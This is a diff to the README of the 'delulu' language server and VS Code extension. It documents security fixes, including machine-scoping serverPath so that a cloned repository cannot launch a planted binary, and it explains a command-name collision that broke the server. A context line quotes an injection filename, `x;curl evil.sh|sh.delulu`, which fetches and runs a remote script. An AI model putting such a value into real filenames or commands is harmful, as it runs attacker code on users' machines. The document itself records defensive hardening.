@@ -49,7 +49,10 @@ transport: stdio
 - **Code lenses** on `fn main` (`▶ run`, `authority: {…}`) and every `test` block (`▶ run test`,
   which runs *that* test by name — it used to run the whole file).
 - **`delulu.authority`** (workspace/executeCommand) — the §10.5 authority report as
-  JSON over the wire; agent harnesses call this instead of shelling out.
+  JSON over the wire; agent harnesses call this instead of shelling out. In an editor this is
+  reached through the client-side command **`delulu.showAuthority`**, which is what the lens names
+  and what appears in the Command Palette. The two names are deliberately different — see the note
+  under *VS Code* below, where making them the same disabled the language server entirely.
 - **Signature help** — while writing a call, the callee's parameters *and its
   authority row*, with the argument you are on highlighted. The label is sliced from
   the declaring file's own source, so you see the signature exactly as its author wrote
@@ -85,7 +88,42 @@ availability is not a security property (spec §11).
   code --install-extension delulu-lang.vsix
   ```
 
-  It requires `delulu` on your `PATH`; set `delulu.serverPath` if it is elsewhere.
+  It requires `delulu` on your `PATH`; set `delulu.serverPath` if it is elsewhere. If neither
+  holds, the extension says so plainly — which binary it looked for, how many `PATH` entries it
+  searched, and the two ways to fix it — rather than the language client's default
+  *"couldn't create connection to server"*, which names neither cause nor cure. `delulu.trace.server`
+  set to `verbose` logs every request and response to the **DeluluLang** output channel; that is the
+  setting to turn on before reporting a bug.
+
+  **`delulu.serverPath` is machine-scoped, and that is a security boundary.** With VS Code's default
+  scope a repository's own `.vscode/settings.json` can write it, and this extension launches that
+  path as a process the moment a `.delulu` file is opened. Opening a cloned repository therefore ran
+  a binary the repository chose, with no click from the user. That was reproduced end-to-end against
+  a build of this extension — planted executable, 7 seconds after the folder opened — and the fixed
+  build never ran it, with nothing different between the two packages but the `scope` line.
+  `editor_contract.rs` now fails the build for *any* setting that names a path, binary, or argument
+  list and is not machine-scoped. The extension also resolves the configured name to an absolute
+  path itself instead of letting the OS do it, because on Windows `CreateProcess` searches the
+  current directory before `PATH`; `editors/vscode/test/resolve.test.js` pins that behaviour.
+
+  `delulu run` and `delulu test` additionally refuse to run in an untrusted workspace, since they
+  execute the workspace's own code. Analysis deliberately still runs there: reading a hostile file is
+  what a language server is for.
+
+  **The editor's command and the server's command must not share a name.** A language client
+  registers a VS Code command for every entry in the server's `executeCommandProvider.commands`
+  while it initializes. Registering the same name in `extension.js` therefore collides with our own
+  client: `registerCommand` throws *"command 'delulu.authority' already exists"* from inside
+  `client.start()`, initialization fails, the queued `didOpen` is dropped, and the server is shut
+  down. **This project shipped in that state** — syntax highlighting and nothing else, in every
+  workspace — and the whole test suite was green, because `lsp_cli.rs` talks to the server without
+  being a VS Code client and `editor_contract.rs` compares source text without running anything.
+  The lens now names `delulu.showAuthority`; `editor_contract.rs` fails the build if the two lists
+  ever overlap again, and `editors/vscode/e2e.js` launches a real VS Code against a real server and
+  requires three positive signals — the extension activated, a `delulu … lsp` process is alive, and
+  `textDocument/publishDiagnostics` appears in the trace. Its first draft asserted only the *absence*
+  of errors and passed the broken build, which is the same mistake that let the bug ship: silence is
+  not evidence.
 
   **It is bundled into one file on purpose.** Shipping the dependency tree instead produced a `.vsix`
   that packaged cleanly and would have thrown `Cannot find module` on activation: `npm install` put 8
@@ -98,9 +136,8 @@ availability is not a security property (spec §11).
   `` `${serverPath} run ${fsPath}` `` and handed it to the user's shell, so a file named
   `x;curl evil.sh|sh.delulu` executed on click and any path with a space ran the wrong command.
   `crates/delulu/tests/editor_contract.rs` fails the build if that shape returns, and if the three
-  lists — commands the server emits, commands the client registers, commands the manifest declares —
-  ever disagree. They had disagreed since Stage 8: `delulu.authority` was emitted by the server and
-  registered by nobody, so clicking that lens raised *"command not found"* for the life of the feature.
+  lists — commands the server emits in lenses, commands the client registers, commands the manifest
+  declares — ever disagree.
 - **Zed / Helix / Neovim (lspconfig) / Kate / Emacs (eglot):** point the editor's LSP
   config at `delulu lsp` for `*.delulu` — the three-line config above is all of it.
 - **JetBrains:** via the native LSP support (2023.2+) or the LSP4IJ plugin; same command.
